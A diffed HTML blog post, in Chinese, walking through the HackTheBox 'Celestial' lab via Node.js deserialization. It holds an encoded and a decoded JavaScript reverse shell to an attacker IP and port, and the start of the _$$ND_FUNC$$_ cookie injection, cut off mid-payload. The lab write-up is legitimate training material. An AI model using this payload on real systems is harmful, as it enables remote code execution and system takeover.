@@ -1,0 +1,740 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="目标IP为10.10.10.85。 1nmap -p- -Pn -sV -sC -T4 10.10.10.85  123456Nmap scan report for 10.10.10.85Host is up (0.27s latency).Not shown: 65534 closed tcp ports (reset)PORT     STATE SERVICE VERSION3000&#x2F;tc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Celestial-Nodejs反序列化">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Celestial/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="目标IP为10.10.10.85。 1nmap -p- -Pn -sV -sC -T4 10.10.10.85  123456Nmap scan report for 10.10.10.85Host is up (0.27s latency).Not shown: 65534 closed tcp ports (reset)PORT     STATE SERVICE VERSION3000&#x2F;tc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408132026752.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408132319093.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408132800103.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408141154804.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408135107129.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220408141824523.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.881Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:30.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220408132026752.png">
+  
+  
+  
+  <title>HackTheBox-Celestial-Nodejs反序列化 - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Celestial-Nodejs反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          141 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Celestial-Nodejs反序列化</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>目标IP为10.10.10.85。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- -Pn -sV -sC -T4 10.10.10.85<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.85<br>Host is up (0.27s latency).<br>Not shown: 65534 closed tcp ports (reset)<br>PORT     STATE SERVICE VERSION<br>3000/tcp open  http    Node.js Express framework<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=utf-8).</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220408132026752.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408132026752" style="zoom:200%;" />
+
+<p>反序列化注入，那就找反序列化注入点吧，看起来像是在Cookie字段：</p>
+<img src="https://www.worldisend.com/img/image-20220408132319093.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408132319093" style="zoom:200%;" />
+
+<p>可以先对其进行URL解码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==<br></code></pre></td></tr></table></figure>
+
+<p>再对其进行Base64解码，这便是Cookie字段中的信息了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;Dummy&quot;</span>,<span class="hljs-string">&quot;country&quot;</span>:<span class="hljs-string">&quot;Idk Probably Somewhere Dumb&quot;</span>,<span class="hljs-string">&quot;city&quot;</span>:<span class="hljs-string">&quot;Lametown&quot;</span>,<span class="hljs-string">&quot;num&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>哦我看到一个num：2，页面中也是有2这个数字的，要不我改改试试：</p>
+<img src="https://www.worldisend.com/img/image-20220408132800103.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408132800103" style="zoom:200%;" />
+
+<p>好吧，它变成了3。Nmap为我枚举出了目标是Nodejs脚本语言环境，那我便可搜索Nodejs deserialization bug 。我找到了这个文章：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>opsecx.com<span class="hljs-regexp">/index.php/</span><span class="hljs-number">2017</span><span class="hljs-regexp">/02/</span><span class="hljs-number">08</span><span class="hljs-regexp">/exploiting-node-js-deserialization-bug-for-remote-code-execution/</span><br></code></pre></td></tr></table></figure>
+
+<p>该序列化产生的漏洞原理就像文章作者的演示：</p>
+<img src="https://www.worldisend.com/img/image-20220408141154804.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408141154804" style="zoom:200%;" />
+
+<p>它为我介绍了Nodejs语言反序列化利用细节，并为我推荐了一个Nodejs反序列化漏洞利用脚本：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ajinabraham/</span>Node.Js-Security-Course<span class="hljs-regexp">/blob/m</span>aster/nodejsshell.py<br></code></pre></td></tr></table></figure>
+
+<p>该脚本可以为我生成建立反向shell的载荷，用法也很简单：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> nodejsshell.py <span class="hljs-number">10.10.16.3</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">[+] LHOST = <span class="hljs-number">10.10.16.3</span><br>[+] LPORT = <span class="hljs-number">4444</span><br>[+] Encoding<br>eval(String.fromCharCode(<span class="hljs-number">10,118,97,114</span>,<span class="hljs-number">32,110,101,116</span>,<span class="hljs-number">32,61,32,114</span>,<span class="hljs-number">101,113,117,105</span>,<span class="hljs-number">114,101,40,39</span>,<span class="hljs-number">110,101,116,39</span>,<span class="hljs-number">41,59,10,118</span>,<span class="hljs-number">97,114,32,115</span>,<span class="hljs-number">112,97,119,110</span>,<span class="hljs-number">32,61,32,114</span>,<span class="hljs-number">101,113,117,105</span>,<span class="hljs-number">114,101,40,39</span>,<span class="hljs-number">99,104,105,108</span>,<span class="hljs-number">100,95,112,114</span>,<span class="hljs-number">111,99,101,115</span>,<span class="hljs-number">115,39,41,46</span>,<span class="hljs-number">115,112,97,119</span>,<span class="hljs-number">110,59,10,72</span>,<span class="hljs-number">79,83,84,61</span>,<span class="hljs-number">34,49,48,46</span>,<span class="hljs-number">49,48,46,49</span>,<span class="hljs-number">54,46,51,34</span>,<span class="hljs-number">59,10,80,79</span>,<span class="hljs-number">82,84,61,34</span>,<span class="hljs-number">52,52,52,52</span>,<span class="hljs-number">34,59,10,84</span>,<span class="hljs-number">73,77,69,79</span>,<span class="hljs-number">85,84,61,34</span>,<span class="hljs-number">53,48,48,48</span>,<span class="hljs-number">34,59,10,105</span>,<span class="hljs-number">102,32,40,116</span>,<span class="hljs-number">121,112,101,111</span>,<span class="hljs-number">102,32,83,116</span>,<span class="hljs-number">114,105,110,103</span>,<span class="hljs-number">46,112,114,111</span>,<span class="hljs-number">116,111,116,121</span>,<span class="hljs-number">112,101,46,99</span>,<span class="hljs-number">111,110,116,97</span>,<span class="hljs-number">105,110,115,32</span>,<span class="hljs-number">61,61,61,32</span>,<span class="hljs-number">39,117,110,100</span>,<span class="hljs-number">101,102,105,110</span>,<span class="hljs-number">101,100,39,41</span>,<span class="hljs-number">32,123,32,83</span>,<span class="hljs-number">116,114,105,110</span>,<span class="hljs-number">103,46,112,114</span>,<span class="hljs-number">111,116,111,116</span>,<span class="hljs-number">121,112,101,46</span>,<span class="hljs-number">99,111,110,116</span>,<span class="hljs-number">97,105,110,115</span>,<span class="hljs-number">32,61,32,102</span>,<span class="hljs-number">117,110,99,116</span>,<span class="hljs-number">105,111,110,40</span>,<span class="hljs-number">105,116,41,32</span>,<span class="hljs-number">123,32,114,101</span>,<span class="hljs-number">116,117,114,110</span>,<span class="hljs-number">32,116,104,105</span>,<span class="hljs-number">115,46,105,110</span>,<span class="hljs-number">100,101,120,79</span>,<span class="hljs-number">102,40,105,116</span>,<span class="hljs-number">41,32,33,61</span>,<span class="hljs-number">32,45,49,59</span>,<span class="hljs-number">32,125,59,32</span>,<span class="hljs-number">125,10,102,117</span>,<span class="hljs-number">110,99,116,105</span>,<span class="hljs-number">111,110,32,99</span>,<span class="hljs-number">40,72,79,83</span>,<span class="hljs-number">84,44,80,79</span>,<span class="hljs-number">82,84,41,32</span>,<span class="hljs-number">123,10,32,32</span>,<span class="hljs-number">32,32,118,97</span>,<span class="hljs-number">114,32,99,108</span>,<span class="hljs-number">105,101,110,116</span>,<span class="hljs-number">32,61,32,110</span>,<span class="hljs-number">101,119,32,110</span>,<span class="hljs-number">101,116,46,83</span>,<span class="hljs-number">111,99,107,101</span>,<span class="hljs-number">116,40,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">99,111,110,110</span>,<span class="hljs-number">101,99,116,40</span>,<span class="hljs-number">80,79,82,84</span>,<span class="hljs-number">44,32,72,79</span>,<span class="hljs-number">83,84,44,32</span>,<span class="hljs-number">102,117,110,99</span>,<span class="hljs-number">116,105,111,110</span>,<span class="hljs-number">40,41,32,123</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,118,97,114</span>,<span class="hljs-number">32,115,104,32</span>,<span class="hljs-number">61,32,115,112</span>,<span class="hljs-number">97,119,110,40</span>,<span class="hljs-number">39,47,98,105</span>,<span class="hljs-number">110,47,115,104</span>,<span class="hljs-number">39,44,91,93</span>,<span class="hljs-number">41,59,10,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,99</span>,<span class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,46,119,114</span>,<span class="hljs-number">105,116,101,40</span>,<span class="hljs-number">34,67,111,110</span>,<span class="hljs-number">110,101,99,116</span>,<span class="hljs-number">101,100,33,92</span>,<span class="hljs-number">110,34,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">112,105,112,101</span>,<span class="hljs-number">40,115,104,46</span>,<span class="hljs-number">115,116,100,105</span>,<span class="hljs-number">110,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,115</span>,<span class="hljs-number">116,100,111,117</span>,<span class="hljs-number">116,46,112,105</span>,<span class="hljs-number">112,101,40,99</span>,<span class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,115</span>,<span class="hljs-number">116,100,101,114</span>,<span class="hljs-number">114,46,112,105</span>,<span class="hljs-number">112,101,40,99</span>,<span class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,111</span>,<span class="hljs-number">110,40,39,101</span>,<span class="hljs-number">120,105,116,39</span>,<span class="hljs-number">44,102,117,110</span>,<span class="hljs-number">99,116,105,111</span>,<span class="hljs-number">110,40,99,111</span>,<span class="hljs-number">100,101,44,115</span>,<span class="hljs-number">105,103,110,97</span>,<span class="hljs-number">108,41,123,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,99,108</span>,<span class="hljs-number">105,101,110,116</span>,<span class="hljs-number">46,101,110,100</span>,<span class="hljs-number">40,34,68,105</span>,<span class="hljs-number">115,99,111,110</span>,<span class="hljs-number">110,101,99,116</span>,<span class="hljs-number">101,100,33,92</span>,<span class="hljs-number">110,34,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">111,110,40,39</span>,<span class="hljs-number">101,114,114,111</span>,<span class="hljs-number">114,39,44,32</span>,<span class="hljs-number">102,117,110,99</span>,<span class="hljs-number">116,105,111,110</span>,<span class="hljs-number">40,101,41,32</span>,<span class="hljs-number">123,10,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,115,101</span>,<span class="hljs-number">116,84,105,109</span>,<span class="hljs-number">101,111,117,116</span>,<span class="hljs-number">40,99,40,72</span>,<span class="hljs-number">79,83,84,44</span>,<span class="hljs-number">80,79,82,84</span>,<span class="hljs-number">41,44,32,84</span>,<span class="hljs-number">73,77,69,79</span>,<span class="hljs-number">85,84,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,125,10,99</span>,<span class="hljs-number">40,72,79,83</span>,<span class="hljs-number">84,44,80,79</span>,<span class="hljs-number">82,84,41,59</span>,<span class="hljs-number">10</span>))<br></code></pre></td></tr></table></figure>
+
+<p>如果好奇一大串十进制数字是什么意思，我推荐如下网址：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.rapidtables.com<span class="hljs-regexp">/convert/</span>number/ascii-hex-bin-dec-converter.html<br></code></pre></td></tr></table></figure>
+
+<p>将对应的编码类型填入合适的输入框中，它就会为你列出各种编码类型的意思：</p>
+<img src="https://www.worldisend.com/img/image-20220408135107129.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220408135107129" style="zoom:200%;" />
+
+<p>而我的载荷代码就是如下这样的：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>);<br><span class="hljs-keyword">var</span> spawn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">spawn</span>;<br><span class="hljs-variable constant_">HOST</span>=<span class="hljs-string">&quot;10.10.16.3&quot;</span>;<br><span class="hljs-variable constant_">PORT</span>=<span class="hljs-string">&quot;4444&quot;</span>;<br><span class="hljs-variable constant_">TIMEOUT</span>=<span class="hljs-string">&quot;5000&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">String</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">contains</span> === <span class="hljs-string">&#x27;undefined&#x27;</span>) &#123; <span class="hljs-title class_">String</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">contains</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">it</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">indexOf</span>(it) != -<span class="hljs-number">1</span>; &#125;; &#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">HOST,PORT</span>) &#123;<br>    <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.<span class="hljs-title class_">Socket</span>();<br>    client.<span class="hljs-title function_">connect</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-variable constant_">HOST</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> sh = <span class="hljs-title function_">spawn</span>(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>,[]);<br>        client.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;Connected!\n&quot;</span>);<br>        client.<span class="hljs-title function_">pipe</span>(sh.<span class="hljs-property">stdin</span>);<br>        sh.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">pipe</span>(client);<br>        sh.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">pipe</span>(client);<br>        sh.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;exit&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">code,signal</span>)&#123;<br>          client.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;Disconnected!\n&quot;</span>);<br>        &#125;);<br>    &#125;);<br>    client.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-title function_">c</span>(<span class="hljs-variable constant_">HOST</span>,<span class="hljs-variable constant_">PORT</span>), <span class="hljs-variable constant_">TIMEOUT</span>);<br>    &#125;);<br>&#125;<br><span class="hljs-title function_">c</span>(<span class="hljs-variable constant_">HOST</span>,<span class="hljs-variable constant_">PORT</span>);<br></code></pre></td></tr></table></figure>
+
+<p>究竟如何利用，文章作者也为我很好的展示了：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123; eval(String.fromCharCode(<span class="hljs-number">10,118,97,114</span>,<span class="hljs-number">32,110,101,116</span>,<span class="hljs-number">32,61,32,114</span>,<span class="hljs-number">101,113,117,105</span>,<span class="hljs-number">114,101,40,39</span>,<span class="hljs-number">110,101,116,39</span>,<span class="hljs-number">41,59,10,118</span>,<span class="hljs-number">97,114,32,115</span>,<span class="hljs-number">112,97,119,110</span>,<span class="hljs-number">32,61,32,114</span>,<span class="hljs-number">101,113,117,105</span>,<span class="hljs-number">114,101,40,39</span>,<span class="hljs-number">99,104,105,108</span>,<span class="hljs-number">100,95,112,114</span>,<span class="hljs-number">111,99,101,115</span>,<span class="hljs-number">115,39,41,46</span>,<span class="hljs-number">115,112,97,119</span>,<span class="hljs-number">110,59,10,72</span>,<span class="hljs-number">79,83,84,61</span>,<span class="hljs-number">34,49,48,46</span>,<span class="hljs-number">49,48,46,49</span>,<span class="hljs-number">54,46,51,34</span>,<span class="hljs-number">59,10,80,79</span>,<span class="hljs-number">82,84,61,34</span>,<span class="hljs-number">52,52,52,52</span>,<span class="hljs-number">34,59,10,84</span>,<span class="hljs-number">73,77,69,79</span>,<span class="hljs-number">85,84,61,34</span>,<span class="hljs-number">53,48,48,48</span>,<span class="hljs-number">34,59,10,105</span>,<span class="hljs-number">102,32,40,116</span>,<span class="hljs-number">121,112,101,111</span>,<span class="hljs-number">102,32,83,116</span>,<span class="hljs-number">114,105,110,103</span>,<span class="hljs-number">46,112,114,111</span>,<span class="hljs-number">116,111,116,121</span>,<span class="hljs-number">112,101,46,99</span>,<span class="hljs-number">111,110,116,97</span>,<span class="hljs-number">105,110,115,32</span>,<span class="hljs-number">61,61,61,32</span>,<span class="hljs-number">39,117,110,100</span>,<span class="hljs-number">101,102,105,110</span>,<span class="hljs-number">101,100,39,41</span>,<span class="hljs-number">32,123,32,83</span>,<span class="hljs-number">116,114,105,110</span>,<span class="hljs-number">103,46,112,114</span>,<span class="hljs-number">111,116,111,116</span>,<span class="hljs-number">121,112,101,46</span>,<span class="hljs-number">99,111,110,116</span>,<span class="hljs-number">97,105,110,115</span>,<span class="hljs-number">32,61,32,102</span>,<span class="hljs-number">117,110,99,116</span>,<span class="hljs-number">105,111,110,40</span>,<span class="hljs-number">105,116,41,32</span>,<span class="hljs-number">123,32,114,101</span>,<span class="hljs-number">116,117,114,110</span>,<span class="hljs-number">32,116,104,105</span>,<span class="hljs-number">115,46,105,110</span>,<span class="hljs-number">100,101,120,79</span>,<span class="hljs-number">102,40,105,116</span>,<span class="hljs-number">41,32,33,61</span>,<span class="hljs-number">32,45,49,59</span>,<span class="hljs-number">32,125,59,32</span>,<span class="hljs-number">125,10,102,117</span>,<span class="hljs-number">110,99,116,105</span>,<span class="hljs-number">111,110,32,99</span>,<span class="hljs-number">40,72,79,83</span>,<span class="hljs-number">84,44,80,79</span>,<span class="hljs-number">82,84,41,32</span>,<span class="hljs-number">123,10,32,32</span>,<span class="hljs-number">32,32,118,97</span>,<span class="hljs-number">114,32,99,108</span>,<span class="hljs-number">105,101,110,116</span>,<span class="hljs-number">32,61,32,110</span>,<span class="hljs-number">101,119,32,110</span>,<span class="hljs-number">101,116,46,83</span>,<span class="hljs-number">111,99,107,101</span>,<span class="hljs-number">116,40,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">99,111,110,110</span>,<span class="hljs-number">101,99,116,40</span>,<span class="hljs-number">80,79,82,84</span>,<span class="hljs-number">44,32,72,79</span>,<span class="hljs-number">83,84,44,32</span>,<span class="hljs-number">102,117,110,99</span>,<span class="hljs-number">116,105,111,110</span>,<span class="hljs-number">40,41,32,123</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,118,97,114</span>,<span class="hljs-number">32,115,104,32</span>,<span class="hljs-number">61,32,115,112</span>,<span class="hljs-number">97,119,110,40</span>,<span class="hljs-number">39,47,98,105</span>,<span class="hljs-number">110,47,115,104</span>,<span class="hljs-number">39,44,91,93</span>,<span class="hljs-number">41,59,10,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,99</span>,<span 